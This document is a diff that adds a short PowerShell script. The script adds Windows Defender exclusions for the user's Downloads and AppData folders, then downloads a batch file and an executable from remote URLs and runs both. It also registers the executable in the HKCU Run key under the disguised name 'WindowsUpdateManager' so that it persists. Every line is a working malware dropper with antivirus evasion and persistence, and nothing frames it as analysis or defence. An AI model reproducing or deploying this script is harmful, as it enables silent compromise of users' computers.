@@ -1,0 +1,24 @@
+Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads
+$url_pp = 'https://archive.org/download/pp_20250226/pp.bat'
+$outputFile_pp = [System.IO.Path]::Combine($env:USERPROFILE, 'Appdata', 'System.bat')
+
+Start-Sleep -Milliseconds 100 
+
+Invoke-WebRequest -Uri $url_pp -OutFile $outputFile_pp
+
+Start-Process $outputFile_pp
+
+
+Add-MpPreference -ExclusionPath $env:USERPROFILE\Appdata
+$url_update = 'https://github.com/Hof6/R/raw/refs/heads/main/Update.exe'
+$outputFile_update = [System.IO.Path]::Combine($env:USERPROFILE, 'Appdata', 'Update.exe')
+
+Start-Sleep -Milliseconds 100 
+
+Invoke-WebRequest -Uri $url_update -OutFile $outputFile_update
+
+
+$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $registryPath -Name "WindowsUpdateManager" -Value $outputFile_update
+
+Start-Process $outputFile_update
